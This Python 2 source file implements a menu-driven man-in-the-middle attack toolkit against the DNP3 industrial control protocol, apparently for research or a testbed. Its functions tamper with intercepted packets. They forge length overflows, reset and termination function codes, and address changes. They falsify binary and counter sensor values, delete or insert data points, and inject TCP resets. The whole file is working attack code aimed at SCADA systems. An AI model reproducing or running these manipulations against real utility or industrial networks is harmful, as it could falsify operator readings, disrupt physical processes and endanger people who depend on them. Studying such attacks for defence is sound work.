__author__ = 'Nicholas Rodofile'

from DNP3_Lib_ import *

def red(str):
    return '\033[91m' + str + '\033[0m \n'

def length_over_flow(pkt):
    if pkt.haslayer(DNP3):
        pkt[DNP3].LENGTH = 44
        #print red("Lenght Overflow")
    return pkt


def DFC_flag(pkt):
    if pkt.haslayer(DNP3):
        if pkt.haslayer(DNP3HeaderControl):
            if pkt[DNP3].CONTROL.DIR == MASTER:
                pkt[DNP3].CONTROL.DFC = SET
                #print red("DFC flag Attack")
    return pkt


def reset_function(pkt):
    if pkt.haslayer(DNP3):
        if pkt.haslayer(DNP3HeaderControl):
            if pkt[DNP3].CONTROL.DIR == OUTSTATION:
                pkt[DNP3].CONTROL.FUNC_CODE_SEC = 13
                #print red("Reset function Attack")
    return pkt


def unavailable_function(pkt):
    if pkt.haslayer(DNP3):
        if pkt.haslayer(DNP3HeaderControl):
            if pkt[DNP3].CONTROL.DIR == MASTER:
                pkt[DNP3].CONTROL.FUNC_CODE_PRI = 14
                #print red("Unavailable function Attack")
    return pkt


def address_alteration(pkt):
    if pkt.haslayer(DNP3):
        pkt[DNP3].DESTINATION = 2
        #print red("Address alteration Attack")
    return pkt


def fragment_interruption_FIR(pkt):
    if pkt.haslayer(DNP3Transport):
        pkt[DNP3Transport].FIR = SET
        #print red("Fragment interruption FIR Attack")
    return pkt


def fragment_interruption_FIN(pkt):
    if pkt.haslayer(DNP3Transport):
        pkt[DNP3Transport].FIN = SET
        #print red("Fragment interruption FIN Attack")
    return pkt


def transport_sequence_modification(pkt):
    if pkt.haslayer(DNP3Transport):
        pkt[DNP3Transport].SEQUENCE += 1
        seq = pkt[DNP3Transport].SEQUENCE
        #print red("Transport Sequence Modification Attack: sequence is "), seq
    return pkt

def application_function_modification(pkt, code):
    if pkt.haslayer(DNP3ApplicationRequest):
        pkt[DNP3ApplicationRequest].FUNC_CODE = code
        #print red("Application Function Modification: Code is "), code
        #pkt.show2() --DEBUGGING
    return pkt

def outstation_write(pkt):
    return application_function_modification(pkt, 2)


def clear_objects(pkt):
    return application_function_modification(pkt, 9)

def clear_objects2(pkt):
    return application_function_modification(pkt, 10)


def clear_data_reset(pkt):
    return application_function_modification(pkt, 15)


def application_termination(pkt):
    return application_function_modification(pkt, 18)


def application_config_capture(pkt):
    if is_unsolicited(pkt):
        return pkt
    if pkt.haslayer(DNP3ApplicationResponse):
        pkt[DNP3ApplicationResponse].IIN.CONFIG_CORRUPT = SET
        #print red("application_config_capture")

    return pkt

def IMMED_FREEZE_NR_modification(pkt):
    if pkt.haslayer(DNP3ApplicationRequest) and pkt.haslayer(DNP3RequestClassObjects):
        if len(pkt.DataObject) == 1:
            if pkt.DataObject[0].Var == 2:
                pkt.DataObject[0].Var = 0
                pkt.DataObject[0].Obj = 20
                pkt.FUNC_CODE = "IMMED_FREEZE_NR"
                print "IMMED_FREEZE_NR"
    return pkt

def BinaryStatus_modification(pkt):
    if pkt.haslayer(IndexPoints8BitAndStartStopBinaryInput):
        if pkt[BinaryStatus][0].STATE == SET:
            pkt[BinaryStatus][0].STATE = UNSET
            print "UNSET"
            return pkt
        else:
            pkt[BinaryStatus][0].STATE = SET
            print "SET"
            return pkt
    return pkt

counter_val = 66
def CounterStatus_modification(pkt):
    if pkt.haslayer(DNP3ResponseDataObjects) and pkt.haslayer(CounterStatus):
        print counter_val
        pkt[CounterStatus].Counter = counter_val
    return pkt

def BinaryInputPointDelete(pkt):
    if pkt.haslayer(IndexPoints8BitAndStartStopBinaryInput):
        data_objects = pkt[IndexPoints8BitAndStartStopBinaryInput].DataPointsBinaryInput
        if len(data_objects) > 1:
            length = len(data_objects[-1:][0])
            pkt[IndexPoints8BitAndStartStopBinaryInput].DataPointsBinaryInput = data_objects[:-1]
            pkt[IndexPoints8BitAndStartStopBinaryInput].stop -= 1
            pkt[DNP3].LENGTH -= length
            pkt[IP].len -= length
            print "InputpointDelete"
    return pkt

def BinaryInputDataDelete(pkt):
    if pkt.haslayer(DNP3ResponseDataObjects):
        dataObjects = pkt[DNP3ResponseDataObjects].DataObject
        length = 0
        for d in dataObjects:
            if d.haslayer(IndexPoints8BitAndStartStopBinaryInput):
                length += len(d[0])
                dataObjects.remove(d)
                print "IndexPoints8BitAndStartStopBinaryInput DataDelete"
                pkt[DNP3].LENGTH -= length
                pkt[IP].len -= length
                return pkt
    return pkt

def CountBinaryInputDataDelete(pkt):
    if pkt.haslayer(DNP3ResponseDataObjects):
        dataObjects = pkt[DNP3ResponseDataObjects].DataObject
        length = 0
        for d in dataObjects:
            if d.haslayer(IndexPointsSingleOctetCountBinaryInput):
                length += len(d[0])
                dataObjects.remove(d)
                print "IndexPointsSingleOctetCountBinaryInput DataDelete"
                pkt[DNP3].LENGTH -= length
                pkt[IP].len -= length
                return pkt
    return pkt


def BinaryInputPointInsert(pkt):
    if pkt.haslayer(IndexPoints8BitAndStartStopBinaryInput):
        data_objects = pkt[IndexPoints8BitAndStartStopBinaryInput].DataPointsBinaryInput
        if len(data_objects) >= 1:
            binaryStatus = BinaryStatus(ONLINE=SET, STATE=UNSET)
            length = len(binaryStatus)
            data_objects.append(binaryStatus)
            pkt[IndexPoints8BitAndStartStopBinaryInput].stop += 1
            pkt[DNP3].LENGTH += length
            pkt[IP].len += length
            print "IndexPoints8BitAndStartStopBinaryInput PointInsert"
    return pkt

def CountBinaryInputPointInsert(pkt):
    if pkt.haslayer(IndexPointsSingleOctetCountBinaryInput):
        data_objects = pkt[IndexPointsSingleOctetCountBinaryInput].DataPointsBinary
        if len(data_objects) >= 1:
            binaryStatus = BinaryStatus(ONLINE=SET, STATE=UNSET)
            binaryInx = BinaryIndex(index=10, binary_status=binaryStatus)
            length = len(binaryInx)
            data_objects.append(binaryInx)
            pkt[IndexPointsSingleOctetCountBinaryInput].count += 1
            pkt[DNP3].LENGTH += length
            pkt[IP].len += length
            print "IndexPointsSingleOctetCountBinaryInput PointInsert"
    return pkt


def faithful_forwarding(pkt):
    return pkt

def faithful_forwarding_sequence(pkt):
    if pkt.haslayer(DNP3Transport) and pkt.haslayer(TCP):
        print "SEQENCE TCP \t", pkt[TCP].seq
        print "ACK TCP \t", pkt[TCP].ack
        print "SEQENCE DNP3\t", pkt[DNP3Transport].SEQUENCE
    return pkt

def reset_tcp(pkt):
    if pkt.haslayer(TCP):
        pkt[TCP].flags = "R"
        pkt[TCP].ack = 0
        print "RESET FLAG"
    return pkt

def reset_ack_tcp(pkt):
    if pkt.haslayer(TCP):
        pkt[TCP].flags = "RA"
        print "RESET FLAG"
    return pkt

DNP3_MITM_functions = {
    "application_termination": application_termination,
    "clear_data_reset": clear_data_reset,
    "clear_objects2": clear_objects2,
    "clear_objects": clear_objects,
    "outstation_write": outstation_write,
    "transport_sequence_modification": transport_sequence_modification,
    "fragment_interruption_FIN": fragment_interruption_FIN,
    "fragment_interruption_FIR": fragment_interruption_FIR,
    "address_alteration": address_alteration,
    "unavailable_function": unavailable_function,
    "reset_function": reset_function,
    "DFC_flag": DFC_flag,
    "length_over_flow": length_over_flow,
    "forwarding": faithful_forwarding,
    "IMMED_FREEZE_NR_modification": IMMED_FREEZE_NR_modification,
    "BinaryStatus_modification": BinaryStatus_modification,
    "CounterStatus_modification": CounterStatus_modification,
    "BinaryInputPointDelete": BinaryInputPointDelete,
    "BinaryInputDataDelete": BinaryInputDataDelete,
    "BinaryInputPointInsert": BinaryInputPointInsert,
    "CountBinaryInputDataDelete": CountBinaryInputDataDelete,
    "CountBinaryInputPointInsert": CountBinaryInputPointInsert,
}


def is_unsolicited(pkt):
    if pkt.haslayer(DNP3ApplicationResponse):
        if pkt[DNP3ApplicationResponse].FUNC_CODE == 0x82:
            print red("application_config_capture")
            return True

    return False


def get_DNP3_attack(input):
    if input == 1:
        print " 1)Length Overflow"
        return length_over_flow

    elif input == 2:
        print " 2)  DFC Flag Attack"
        return DFC_flag

    elif input == 3:
        print " 3)  Reset Function"
        return reset_function

    elif input == 4:
        print " 4)  Unavailable Function"
        return unavailable_function

    elif input == 5:
        print " 5)  Destination Address Alteration"
        return address_alteration

    elif input == 6:
        print " 6)  Fragment Interrupt FIN"
        return fragment_interruption_FIN

    elif input == 7:
        print " 7)  Fragment Interrupt FIR"
        return fragment_interruption_FIR

    elif input == 8:
        print " 8)  Transport Sequence Modification"
        return transport_sequence_modification

    elif input == 9:
        print " 9)  Outstation Write"
        return outstation_write

    elif input == 10:
        print " 10) Outstation Clear Objects"
        return clear_objects

    elif input == 11:
        print " 11) Outstation Data Reset"
        return clear_objects2

    elif input == 12:
        print " 12) Outstation Application Termination"
        return application_termination

    elif input == 13:
        print " 13) Configuration Capture"
        return application_config_capture

    elif input == 14:
        print " 14) Faithful forwarding"
        return faithful_forwarding

    elif input == 15:
        print " 15) Faithful forwarding Sequence"
        return faithful_forwarding_sequence

    elif input == 16:
        print " 16) TCP Connection Reset"
        return reset_tcp
    elif input == 17:
        print " 17) TCP Connection Reset (With Acknowledgment)"
        return reset_ack_tcp
    else:
        return None


if __name__ == '__main__':
    Attack_function = None
    def choose_DNP3_attack():
        selected =''
        DNP3_attack = False
        while DNP3_attack is not True:
            print " 1)  Length Overflow"
            print " 2)  DFC Flag Attack"
            print " 3)  Reset Function"
            print " 4)  Unavailable Function"
            print " 5)  Destination Address Alteration"
            print " 6)  Fragment Interrupt FIN"
            print " 7)  Fragment Interrupt FIR"
            print " 8)  Transport Sequence Modification"
            print " 9)  Outstation Write"
            print " 10) Outstation Clear Objects"
            print " 11) Outstation Data Reset"
            print " 12) Outstation Application Termination"
            print " 13) Configuration Capture"
            print " 14) Faithful forwarding"
            print " 15) Faithful forwarding sequence"
            print " 16) TCP Connection Reset"
            print " 17) TCP Connection Reset (With Acknowledgment)"
            selected = int(input("Select Attack \n > "))
            if selected <= 17 or selected >= 1:
                func = get_DNP3_attack(selected)
                if func is not None:
                    DNP3_attack = True
                    return func

